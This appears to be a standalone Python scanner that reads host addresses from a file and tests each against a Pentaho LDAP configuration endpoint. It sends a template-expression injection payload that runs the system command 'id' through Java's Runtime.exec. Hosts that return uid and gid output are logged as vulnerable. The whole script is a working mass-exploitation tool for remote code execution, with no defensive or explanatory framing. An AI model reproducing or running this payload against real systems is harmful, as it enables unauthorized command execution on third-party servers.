import requests

with open("cacti.txt", 'r') as file:
    for line in file:
        baseurl = 'http://'+line.strip('\n')+'/pentaho'
        with open('result1.txt', 'a') as file1:
            file1.write(baseurl+'\n')
        file1.close()
        print(baseurl)
        url = f"{baseurl}/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{{T(java.lang.Runtime).getRuntime().exec('id')}}&mgrDn=a&pwd=a"
        try:
            r = requests.get(url)
            if r.text == 'false':
                with open('result3.txt', 'a') as file1:
                    file1.write(baseurl+'\n')
                file1.close()
            if('uid=' in r.text and 'gid=' in r.text):
                with open('result2.txt', 'a') as file1:
                    file1.write(baseurl+'\n')
                file1.close()
        except:
            a=0
